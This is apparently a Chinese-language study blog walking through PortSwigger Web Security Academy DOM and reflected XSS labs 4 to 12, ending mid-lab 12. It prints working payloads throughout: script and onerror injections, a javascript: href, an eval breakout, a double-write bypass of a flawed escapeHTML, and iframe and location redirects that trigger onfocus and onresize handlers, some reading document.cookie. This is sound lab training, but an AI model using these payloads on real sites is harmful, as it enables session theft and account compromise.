<h1 id="4-Lab-DOM-XSS-in-document-write-sink-using-source-location-search-inside-a-select-element"><a href="#4-Lab-DOM-XSS-in-document-write-sink-using-source-location-search-inside-a-select-element" class="headerlink" title="4 Lab: DOM XSS in document.write sink using source location.search inside a select element"></a>4 Lab: DOM XSS in <code>document.write</code> sink using source <code>location.search</code> inside a select element</h1><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231123142021.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231123142021.png"></a><br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231123142007.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231123142007.png"></a><br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231123142209.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231123142209.png"></a><br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231123142335.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231123142335.png"></a></p>
<p>虽然表单使用的是 POST 方法传参，但是根据 js 代码，<code>storeId</code> 是通过 <code>window.location.search</code> 从url 中获取的。（md，用 burp 抓包弄了半天，人傻了）</p>
<p>请求 url : <code>product?productId=5&amp;storeId=1235134481234</code> </p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231123153437.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231123153437.png"></a></p>
<p>payload1: <code>product?productId=5&amp;storeId=1235134481234&lt;/option&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231123153659.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231123153659.png"></a></p>
<p>payload2: <code>product?productId=5&amp;storeId=&lt;/select&gt;&lt;img%20src=1%20onerror=alert(/xss/)&gt;</code></p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231123154043.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231123154043.png"></a><br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231123154112.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231123154112.png"></a></p>
<h1 id="5-Lab-DOM-XSS-in-innerHTML-sink-using-source-location-search"><a href="#5-Lab-DOM-XSS-in-innerHTML-sink-using-source-location-search" class="headerlink" title="5 Lab: DOM XSS in innerHTML sink using source location.search"></a>5 Lab: DOM XSS in <code>innerHTML</code> sink using source <code>location.search</code></h1><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231123155703.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231123155703.png"></a></p>
<p>js 代码 修改 id 为 ‘searchMessage’ 的标签的 <code>innerHTML</code>。</p>
<blockquote>
<p>[!note] 注：<br><code>innerHTML</code> 中无法使用 <code>&lt;script&gt;</code> 标签。</p>
</blockquote>
<p>^e1ca4a</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231123160034.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231123160034.png"></a></p>
<p>解决方法：使用其他标签，如 <code>&lt;img&gt;</code>，<code>&lt;iframe&gt;</code></p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231123160228.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231123160228.png"></a></p>
<h1 id="6-Lab-DOM-XSS-in-jQuery-anchor-href-attribute-sink-using-location-search-source"><a href="#6-Lab-DOM-XSS-in-jQuery-anchor-href-attribute-sink-using-location-search-source" class="headerlink" title="6 Lab: DOM XSS in jQuery anchor href attribute sink using location.search source"></a>6 Lab: DOM XSS in jQuery anchor <code>href</code> attribute sink using <code>location.search</code> source</h1><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231123171205.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231123171205.png"></a><br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231123171303.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231123171303.png"></a></p>
<p>尝试修改 url，随便改个百度试试 <code>feedback?returnPath=https://www.baidu.com/</code></p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231123171544.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231123171544.png"></a><br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231123171429.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231123171429.png"></a></p>
<p>跳转成功。</p>
<p>构造 payload: <code>/feedback?returnPath=javascript:alert(/xss/)</code></p>
<p>按了回车后，没发现弹窗，考虑了半天，甚至问了 gpt，然后突然意识到，这个 payload 是用来修改右下角 Back 按钮的返回链接的，也就是 <code>&lt;a&gt;</code> 标签的 <code>href</code> 属性。md，又傻逼了。</p>
<p>有些浏览器会阻止在地址栏使用 <code>javascript:</code> 协议，不过跟这个没啥关系。</p>
<h1 id="7-Lab-DOM-XSS-in-jQuery-selector-sink-using-a-hashchange-event"><a href="#7-Lab-DOM-XSS-in-jQuery-selector-sink-using-a-hashchange-event" class="headerlink" title="7 Lab: DOM XSS in jQuery selector sink using a hashchange event"></a>7 Lab: DOM XSS in jQuery selector sink using a hashchange event</h1><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231123232127.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231123232127.png"></a></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	$(<span class="variable language_">window</span>).<span class="title function_">on</span>(<span class="string">&#x27;hashchange&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">		<span class="keyword">var</span> post = $(<span class="string">&#x27;section.blog-list h2:contains(&#x27;</span> + </span><br><span class="line">			<span class="built_in">decodeURIComponent</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">hash</span>.<span class="title function_">slice</span>(<span class="number">1</span>)) + <span class="string">&#x27;)&#x27;</span>);</span><br><span class="line">		<span class="keyword">if</span> (post) post.<span class="title function_">get</span>(<span class="number">0</span>).<span class="title function_">scrollIntoView</span>();</span><br><span class="line">	&#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>分析 js 代码发现，我们可以通过 <code>location.hash</code> 来控制变量 <code>post</code> 的值，进而跳转到相对应的位置。</p>
<p>测试 url <code>/#21st%20Century%20Dreaming</code>，回车之后跳转到 “21st Century Dreaming” 位置，<code>location.hash</code> 就相当于是锚点 (bookmarking)，实现页面内跳转。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231123232417.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231123232417.png"></a></p>
<p>构造 payload url <code>/#&lt;img%20src=&#39;&#39;%20onerror=print(&#39;xss&#39;)&gt;</code> </p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231123232707.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231123232707.png"></a></p>
<blockquote>
<p>[!question] 问题<br>咋还是 <strong>unsolved</strong> ？</p>
<p><strong>答：</strong> 以上操作都算是在自己的浏览器客户端进行的测试 (self cross-site scripting)，类似于 f12 直接修改 html 文件一样。<br>需要寻找一种没有用户交互即可触发 <code>hashchange</code> 事件的方式。</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231124122025.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231124122025.png"></a><br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231124122048.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231124122048.png"></a></p>
<p>在 <strong>Body</strong> 中编写 payload <code>&lt;iframe src=&quot;https://0a5200b2030523bd80fd1cbe00dd0058.web-security-academy.net/#&quot; onload=&quot;this.src+=&#39;&lt;img src=x onerror=print()&gt;&#39;&quot;&gt;&lt;/iframe&gt;</code></p>
<p><strong>Store</strong> 然后 <strong>View exploit</strong> 测试</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231124121952.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231124121952.png"></a></p>
<p>没问题，成功召唤打印机！</p>
<h1 id="8-Lab-Reflected-DOM-XSS"><a href="#8-Lab-Reflected-DOM-XSS" class="headerlink" title="8 Lab: Reflected DOM XSS"></a>8 Lab: Reflected DOM XSS</h1><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231124152550.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231124152550.png"></a><br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231124152723.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231124152723.png"></a><br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231124153236.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231124153236.png"></a><br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231124153756.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231124153756.png"></a><br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231124154701.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231124154701.png"></a></p>
<p>可以使用 burp 抓包，观察参数处理的过程。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;var searchResultsObj = &#x27;</span> + <span class="variable language_">this</span>.<span class="property">responseText</span>);</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">responseText</span> = &#123;<span class="string">&quot;results&quot;</span>:[],<span class="string">&quot;searchTerm&quot;</span>:<span class="string">&quot;1655452184&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>构造 payload1: <code>hello\&quot;&#125;; alert(/xss/);//</code></p>
<p>payload2: <code>\&quot;-alert(1)&#125;//</code></p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231124160437.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231124160437.png"></a><br>拿下。</p>
<blockquote>
<p>[!note]<br>该 lab 转义了 双引号，可以再加一个转义符 <code>\</code> 绕过。</p>
</blockquote>
<h1 id="9-Lab-Stored-DOM-XSS"><a href="#9-Lab-Stored-DOM-XSS" class="headerlink" title="9 Lab: Stored DOM XSS"></a>9 Lab: Stored DOM XSS</h1><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231124184926.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231124184926.png"></a><br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231124185126.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231124185126.png"></a></p>
<p>查看源码发现，评论是由 <code>loadComments()</code> 函数生成的。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231124185554.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231124185554.png"></a></p>
<p>搜索发现 <code>loadComments()</code> 函数在 <code>resource/js/</code> 目录下 <code>loadCommentsWithVulnerableEscapeHtml.js</code> 文件中定义。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231124190423.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231124190423.png"></a></p>
<p>其中 <code>escapeHTML(html)</code> 函数对 “&gt;”，“&lt;” 进行了过滤，除此之外还有大量类似 <code>element.innerHTML = (something you can control)</code> 之类的赋值操作， 如 <code>commentBodyPElement.innerHTML = escapeHTML(comment.body);</code>，存在 XSS 漏洞，其中 <code>comments</code> 是我们可以控制的内容，如下图所示。 </p>
<p>在 JavaScript 中，<code>.replace()</code> 方法默认只替换字符串中的第一个匹配项。如果想替换所有匹配项，需要使用正则表达式并配合全局匹配标志 <code>g</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="string">&quot;&lt;&lt;script&gt;&gt;alert(/xss/)&lt;&lt;/script&gt;&quot;</span>.<span class="title function_">replace</span>(<span class="regexp">/&lt;/g</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>).<span class="title function_">replace</span>(<span class="regexp">/&gt;/g</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>);</span><br><span class="line"><span class="language-xml">&lt;. &#x27;<span class="symbol">&amp;lt;</span><span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span><span class="symbol">&amp;gt;</span>alert(/xss/)<span class="symbol">&amp;lt;</span><span class="symbol">&amp;lt;</span>/script<span class="symbol">&amp;gt;</span>&#x27;</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231124191152.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231124191152.png"></a></p>
<p>构造评论 <code>&lt;sciript&gt;alert(/xss/)&lt;/script&gt;</code>，并没有成功，评论部分还只显示了一半。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231124230410.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231124230410.png"></a></p>
<blockquote>
<p>[!question] 问题<br><code>escapeHTML()</code> 咋绕过呀？</p>
</blockquote>
<p>使用 HTML 编码绕过。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231124233300.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231124233300.png"></a></p>
<p>构造 payload: <code>&lt;/p&gt;&lt;sciript&gt;alert(/xss/)&lt;/script&gt;</code> 的 HTML 编码  <code>&amp;#x3c;&amp;#x2f;&amp;#x70;&amp;#x3e;&amp;#x3c;&amp;#x73;&amp;#x63;&amp;#x69;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3e;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x2f;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x2f;&amp;#x29;&amp;#x3c;&amp;#x2f;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3e;</code></p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231124234608.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231124234608.png"></a><br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231124235745.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231124235745.png"></a></p>
<p>然并卵。这里 [[PortSwigger xss labs#^e1ca4a]] 遇见过，忘了，md</p>
<blockquote>
<p>[!note]<br>如果将 HTML 实体编码的脚本标签插入到元素的 <code>innerHTML</code> 中，虽然浏览器会解析这些实体为对应的字符并构建 DOM 元素，但出于安全考虑，大多数现代浏览器不会执行通过 <code>innerHTML</code> 添加的 <code>&lt;script&gt;</code> 标签中的 JavaScript 代码。</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231125093721.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231125093721.png"></a></p>
<p>使用 HTML 编码的 <code>&lt;img src=1 onerror=alert(/xss/)&gt;</code> ，仍无法运行。</p>
<blockquote>
<p>[!question] 问题<br>使用 <strong>HTML 实体编码的语句</strong>无法执行？</p>
<p>答：HTML 实体编码的内容不会被浏览器解释为实际的 HTML 标签和属性。<strong>（猜测，仍存疑）</strong></p>
</blockquote>
<p>构造 payload: <code>&lt;&gt;&lt;img src=1 onerror=alert(/xss/) /&gt;</code>。如前所述，<code>.replace()</code> 默认只替换第一个匹配项，这个 payload 类似于双写绕过。</p>
<p>成功。</p>
<h1 id="10-Lab-Reflected-XSS-into-HTML-context-with-most-tags-and-attributes-blocked"><a href="#10-Lab-Reflected-XSS-into-HTML-context-with-most-tags-and-attributes-blocked" class="headerlink" title="10 Lab: Reflected XSS into HTML context with most tags and attributes blocked"></a>10 Lab: Reflected XSS into HTML context with most tags and attributes blocked</h1><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231125101815.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231125101815.png"></a><br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231125101801.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231125101801.png"></a></p>
<p>过滤了 <code>&lt;script&gt;</code>，<code>&lt;img&gt;</code>，<code>&lt;frame&gt;</code>，<code>&lt;svg&gt;</code> 等等。</p>
<blockquote>
<p>[!tip] ideas<br>善用、多用 <strong>burp</strong>！！！<br>我还搁这一个一个找呢，直接用 <strong>burp intrude</strong> 模块看看有哪些标签没被过滤。</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231125110242.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231125110242.png"></a><br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231125110355.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231125110355.png"></a><br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231125110328.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231125110328.png"></a><br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231125110603.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231125110603.png"></a></p>
<p>只有一个 <code>body</code> 标签未被过滤。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231125110707.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231125110707.png"></a><br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231125110829.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231125110829.png"></a></p>
<p>属性也被过滤了，你要这么玩可就没意思了嗷！！</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231125111116.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231125111116.png"></a></p>
<p>这里我使用 <code>body</code> 标签和 <code>onresize</code> 事件，payload 可以直接在<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">这里</a>搜。</p>
<blockquote>
<p>[!note]<br><code>onresize</code> 事件会在页面大小改变时执行Javascript代码。</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231125112340.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231125112340.png"></a></p>
<p>Search 之后，F12 打开开发者工具改变页面大小，<code>alert()</code> 执行成功。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231125112406.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231125112406.png"></a></p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231125113011.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231125113011.png"></a></p>
<p>payload: <code>&lt;iframe src=&quot;https://0a8d000f0341882a8073769100a400bc.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E&quot; onload=this.style.width=&#39;100px&#39;&gt;</code></p>
<p><strong>view exploit</strong> 测试一下。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231125113147.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231125113147.png"></a></p>
<p><strong>Deliver exploit to victim</strong> 拿下。</p>
<h1 id="11-Lab-Reflected-XSS-into-HTML-context-with-all-tags-blocked-except-custom-ones"><a href="#11-Lab-Reflected-XSS-into-HTML-context-with-all-tags-blocked-except-custom-ones" class="headerlink" title="11 Lab: Reflected XSS into HTML context with all tags blocked except custom ones"></a>11 Lab: Reflected XSS into HTML context with all tags blocked except custom ones</h1><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231125124411.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231125124411.png"></a></p>
<p>除了几个自定义标签，其余全被过滤掉了。</p>
<blockquote>
<p>[!note] Custom Tags<br>A custom tag is a user-defined JSP language element. </p>
<p>在HTML中，自定义标签（Custom Tags）是指<strong>开发者自己创建的</strong>、<strong>非HTML标准内置</strong>的标签。这些标签可以用于特定的用途，比如组织页面结构、创建复用的UI组件等。自定义标签是Web组件技术的一部分，它们使得前端代码更模块化、可维护和可重用。 —-ChatGPT</p>
</blockquote>
<p>以下是一个自定义标签 <code>&lt;user-card&gt;</code> 的例子。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">UserCard</span> <span class="keyword">extends</span> <span class="title class_ inherited__">HTMLElement</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">super</span>();</span><br><span class="line">        <span class="keyword">var</span> shadow = <span class="variable language_">this</span>.<span class="title function_">attachShadow</span>(&#123;<span class="attr">mode</span>: <span class="string">&#x27;open&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> wrapper = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">        <span class="keyword">var</span> username = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line">        <span class="keyword">var</span> email = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        username.<span class="property">textContent</span> = <span class="string">&#x27;用户名：&#x27;</span> + <span class="variable language_">this</span>.<span class="title function_">getAttribute</span>(<span class="string">&#x27;name&#x27;</span>);</span><br><span class="line">        email.<span class="property">textContent</span> = <span class="string">&#x27;电子邮件：&#x27;</span> + <span class="variable language_">this</span>.<span class="title function_">getAttribute</span>(<span class="string">&#x27;email&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        shadow.<span class="title function_">appendChild</span>(wrapper);</span><br><span class="line">        wrapper.<span class="title function_">appendChild</span>(username);</span><br><span class="line">        wrapper.<span class="title function_">appendChild</span>(email);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注册新元素：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">customElements.<span class="title function_">define</span>(<span class="string">&#x27;user-card&#x27;</span>, <span class="title class_">UserCard</span>);</span><br></pre></td></tr></table></figure>

<p>使用自定义标签：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">user-card</span> <span class="attr">name</span>=<span class="string">&quot;张三&quot;</span> <span class="attr">email</span>=<span class="string">&quot;zhangsan@example.com&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">user-card</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>试了刚爆破得到的自定义标签都不行。直接在 xss cheat-sheet 上搜索 <strong>custom-tags</strong>，选一个 payload <code>&lt;xss tabindex=1 onfocus=alert(1)&gt;&lt;/xss&gt;</code>。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231125131130.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231125131130.png"></a><br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231125132414.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231125132414.png"></a></p>
<p>按下 tab 键聚焦到 <code>&lt;xss&gt;</code> 标签上，触发 <code>alert()</code>。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231125132432.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231125132432.png"></a><br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231125133248.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231125133248.png"></a></p>
<p><strong>Body</strong> 部分的代码：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">location = <span class="string">&quot;https://0a7e00c3036288a98023f9df00c2007b.web-security-academy.net/?search=%20%3c%78%73%73%20%61%75%74%6f%66%6f%63%75%73%20%74%61%62%69%6e%64%65%78%3d%31%20%6f%6e%66%6f%63%75%73%3d%61%6c%65%72%74%28%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%29%3e%3c%2f%78%73%73%3e&quot;</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">解码后：</span><br><span class="line">search=<span class="tag">&lt;<span class="name">xss</span> <span class="attr">autofocus</span> <span class="attr">tabindex</span>=<span class="string">1</span> <span class="attr">onfocus</span>=<span class="string">alert(document.cookie)</span>&gt;</span><span class="tag">&lt;/<span class="name">xss</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload2:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"> </span></span><br><span class="line"><span class="language-javascript">location = <span class="string">&#x27;https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x&#x27;</span>; </span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">解码后：<span class="tag">&lt;<span class="name">xss</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">onfocus</span>=<span class="string">alert(document.cookie)</span> <span class="attr">tabindex</span>=<span class="string">1</span>&gt;</span>#x</span><br></pre></td></tr></table></figure>

<blockquote>
<p>[!note] location 对象<br><code>location</code> 对象在 JavaScript 中用于获取或设置当前文档的 URL</p>
</blockquote>
<p>‘#x’ 是锚点，能聚焦到 ‘id&#x3D;x’ 的元素，从而触发 <code>onfocus</code> 事件，两者组合，达到 <code>autofocus</code> 的效果。</p>
<blockquote>
<p>[!question] 问题<br>exploit server 里面的 body 部分如何编写？每次都是本地手动测试通过但是不会编写 exploit server。</p>
<p>不管是使用 <code>&lt;iframe&gt;</code> 标签还是 <code>&lt;script&gt;</code> 目的都是为了模拟受害人操作，<strong>触发所构造的 url</strong>，达到 ‘Your solution must <strong>not require any user interaction</strong>‘ 的要求。</p>
</blockquote>
<p><code>&lt;firame&gt;</code> 与 <code>&lt;sctipt&gt;</code> 的不同：</p>
<ul>
<li><strong><code>&lt;iframe&gt;</code> 标签</strong>：<code>&lt;iframe&gt;</code> 中的内容通常受到<strong>同源策略</strong>的限制(<code>X-Frame-Options</code>)，尤其是当它尝试访问或修改父页面内容时，如 Lab-10 使用 <code>&lt;iframe&gt;</code> 就没问题。</li>
<li><strong><code>&lt;script&gt;</code> 标签</strong>：通过 <code>&lt;script&gt;</code> 标签注入的代码不受<strong>同源策略</strong>的限制，因为它直接成为了加载它的页面的一部分，location 就相当于是<strong>重定向</strong>。</li>
</ul>
<hr>
<p>在 Body 中使用 <code>&lt;iframe&gt;</code> 报错。payload：<code>&lt;iframe src=&quot;https://0a5500d0036f773980c1e47d00b00003.web-security-academy.net/?search=&lt;xss%20autofocus%20onfocus=&#39;alert(1)&#39;&gt;&lt;/xss&gt;&quot;&gt;&lt;/iframe&gt;</code></p>
<hr>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231125140427.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231125140427.png"></a></p>
<p>报错信息如下，受到 [[浏览器的同源策略]] 影响，<code>X-Frame-Options</code> 头部。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231125140628.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231125140628.png"></a></p>
<h1 id="12-Lab-Reflected-XSS-into-attribute-with-angle-brackets-HTML-encoded"><a href="#12-Lab-Reflected-XSS-into-attribute-with-angle-brackets-HTML-encoded" class="headerlink" title="12 Lab: Reflected XSS into attribute with angle brackets HTML-encoded"></a>12 Lab: Reflected XSS into attribute with angle brackets HTML-encoded</h1><p>任务描述：<code>search</code> 功能存在 xss 漏洞，利用该漏洞，调用 <code>alert()</code></p>
<p>搜索的内容会现在了页面上，且回显了两处，一处是 <code>&lt;h1&gt;</code> 标签，一处是 <code>&lt;input&gt;</code> 中的 <code>value</code> 属性。</p>
<p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240128142419.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240128142419.png"></a></p>
<p>构造 payload 1: <code>&#39;&lt;xss autofocus tabindex=1 onfocus=alert(1)&gt;&lt;/xss&gt;</code></p>
